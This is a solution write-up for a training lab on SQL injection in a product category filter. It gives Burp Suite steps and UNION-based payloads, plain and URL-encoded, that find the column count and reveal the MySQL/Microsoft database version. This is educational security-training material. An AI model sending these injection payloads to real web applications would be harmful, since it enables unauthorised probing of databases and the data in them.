# Lab 8: SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

## Solution
> Manual Exploitation
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter: ```'+UNION+SELECT+'abc','def'#```
3. Use the following payload to display the database version: ```'+UNION+SELECT+@@version,+NULL%23```

> Scripting the attack: [Script](https://github.com/darshannn10/PortSwiggers-Web-Sec-Academy/blob/main/SQL-Injection/lab-08/sqli-lab-08.py)

## Paylaod
Normal: ```' UNION SELECT @@version, NULL#```

URL-Encoded: ```%27+UNION+SELECT+@@version,+NULL%23```

## Video Solution
1. Manual: [Rana Khalil's Youtube video](https://youtu.be/MFTk_LNRW0g)
2. Automating" [Rana Khalil's Youtube Video](https://www.youtube.com/watch?v=jG8qUOg9em0&list=PLuyTk2_mYISLaZC4fVqDuW_hOk0dd5rlf&index=9)
